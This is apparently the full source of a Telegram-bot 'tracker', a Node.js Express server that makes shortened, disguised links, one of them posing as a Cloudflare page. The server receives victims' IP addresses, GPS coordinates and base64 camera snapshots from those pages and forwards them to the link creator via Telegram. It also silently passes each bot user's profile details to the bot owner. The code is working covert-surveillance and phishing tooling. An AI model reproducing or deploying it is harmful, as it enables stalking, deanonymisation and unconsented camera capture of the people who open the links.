//Join My Telegram Channel @SG_Tracker1 
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const botOwnerId = process.env.BOT_OWNER_ID;
const botToken = process.env.BOT_TOKEN;
const bot = new TelegramBot(botToken, { polling: true });
const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
const app = express();
require('dotenv').config();

app.use(express.static('public'));
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Rest of the code remains unchanged...


const hostURL = "https://sgtrackerbot-nj1pj0tu.b4a.run";
let use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
    let ip;
    let d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path !== null) {
        res.render("webview", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    let ip;
    let d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path !== null) {
        res.render("cloudflare", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

async function animatedEditMessage(chatId, messageId, newText) {
    const words = newText.split(' ');
    const wordsPerEdit = 10;
    const interval = 1000;
    let index = 0;

    while (index < words.length) {
        const endIndex = Math.min(index + wordsPerEdit, words.length);
        const editedText = words.slice(0, endIndex).join(' ');

        await bot.editMessageText(editedText, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create Link", callback_data: "crenew" }]
                ]
            })
        });

        index = endIndex;

        if (index < words.length) {
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    }
}

async function getUserDetails(user) {
    const userDetails = `
        User Name: ${user.first_name} ${user.last_name || ""}
        Username: ${user.username || "N/A"}
        User ID: ${user.id}
    `;

    if (user.photo) {
        const photoFile = await bot.getUserProfilePhotos(user.id, 0, 1);
        const photoUrl = await bot.getFileLink(photoFile.photos[0][0].file_id);
        return { userDetails, photoUrl };
    } else {
        return { userDetails };
    }
}

function sendUserDetailsToOwner(userDetails) {
    if (userDetails.photoUrl) {
        bot.sendPhoto(botOwnerId, userDetails.photoUrl, { caption: userDetails.userDetails });
    } else {
        bot.sendMessage(botOwnerId, userDetails.userDetails);
    }
}

async function sendHelpMessage(chatId) {
    const helpMessage = `
    Welcome to the bot! Here are some steps to get started:
    1. Use /start to initiate the bot.
    2. Use /create to create a new link.
    3. Use /help to see this help message.
    4. Use /tutorial to get a tutorial video.
    `;
    await bot.sendMessage(chatId, helpMessage);
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        const isMember = await bot.getChatMember("@SG_Modder1", msg.from.id);
        const isAdmin = await bot.getChatMember("@SG_Modder1", msg.from.id);
        const isChannelAdmin = isAdmin && (isAdmin.status === "creator" || isAdmin.status === "administrator");

        if (isMember && isMember.status !== "left") {
            if (msg?.reply_to_message?.text === "🔖 Drop your URL here:") {
                createLink(chatId, msg.text);
            }

            if (msg.text === "/start") {
                const userDetails = await getUserDetails(msg.from);
                sendUserDetailsToOwner(userDetails);
                const startMessage = `📍 Hello ${msg.chat.first_name}! 🎉,
                \nWelcome to the bot. Follow the steps below to use it:
                \n1. /create - Create a new link.
                \n2. /help - Get help on how to use the bot.
                \n3. /tutorial - Watch a tutorial video.
                \nEnjoy using the bot! 🚀`;

                await bot.sendMessage(chatId, startMessage, {
                    reply_markup: JSON.stringify({
                        "inline_keyboard": [
                            [{ text: "Create Link", callback_data: "crenew" }]
                        ]
                    })
                });
            } else if (msg.text === "/create") {
                createNew(chatId);
            } else if (msg.text === "/help") {
                sendHelpMessage(chatId);
            } else if (msg.text === "/tutorial") {
                const tutorialLink = "https://t.me/SG_Modder1/140";
                await bot.sendMessage(chatId, `Watch the tutorial video here: ${tutorialLink}`);
            }
        } else if (isChannelAdmin) {
            if (msg.text === "/admin_command") {
            }
        } else {
            bot.sendMessage(chatId, "To use this bot, please join @SG_Modder1 channel.", {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "Join Channel", url: "https://t.me/SG_Modder1" }]
                    ]
                })
            });
        }
    } catch (error) {
        console.error("Error occurred:", error);
        bot.sendMessage(chatId, "Apologies, something went wrong. Please try again later.");
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data === "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

bot.on('polling_error', (error) => {
});

async function shortenUrlWithSmolUrl(url) {
    try {
        const apiUrl = 'https://smolurl.com/api/links';
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ url }), // send the URL in the request body
        });

        if (response.ok) {
            const data = await response.json();
            return data.data.short_url; // return the shortened URL from the response
        } else {
            throw new Error('Failed to shorten URL with SmolUrl');
        }
    } catch (error) {
        console.error('Error shortening URL with SmolUrl:', error);
        throw error;
    }
}


async function createLink(cid, msg) {
    const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
        const url = cid.toString(36) + '/' + btoa(msg);
        const m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create new Link", callback_data: "crenew" }]
                ]
            })
        };

        const cUrl = `${hostURL}/c/${url}`;
        const wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");

        try {
            const smolCUrl = await shortenUrlWithSmolUrl(cUrl);
            const smolWUrl = await shortenUrlWithSmolUrl(wUrl);

            bot.sendMessage(cid, `
    🎉 Your link has been created successfully! Here's your tracking URL:
    ✅ Original URL: ${msg}

    🚀 URL to Track:
    🌍 Whole World Support:
        ${smolCUrl}

    🌍 Whole World Support:
        ${smolWUrl}

    🔍 These links are your tools for tracking purposes. Utilize them responsibly and ethically to gather the information you need. For any inquiries or assistance, feel free to reach out. 🛠️
    Stay informed, stay responsible!
    🕵️‍♂️ = @SG_Modder
    `, m);
           } catch (error) {
            console.error('Error shortening links:', error);
            bot.sendMessage(cid, `Failed to shorten links. Please try again later.`);
        }
    } else {
        bot.sendMessage(cid, `❌❌❌Please Enter a valid URL, including http or https.`);
        createNew(cid);
    }
}

function createNew(cid) {
    const mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🔖 Drop your URL here:`, mk);
}

app.get("/", (req, res) => {
    let ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;
    if (lon !== null && lat !== null && uid !== null && acc !== null) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);
        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

app.post("/", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    let data = decodeURIComponent(req.body.data) || null;
    if (uid !== null && data !== null) {
        data = data.replaceAll("<br>", "\n");
        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
        res.send("Done");
    }
});

app.post("/camsnap", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;
    if (uid !== null && img !== null) {
        const buffer = Buffer.from(img, 'base64');
        const info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };
        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }
        res.send("Done");
    }
});
bot.on('polling_error', console.log);
//  Error handler
app.use((req, res, next) => {
    res.status(404).send("Page not found.");
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
//Join My Telegram Channel @SG_Tracker1 
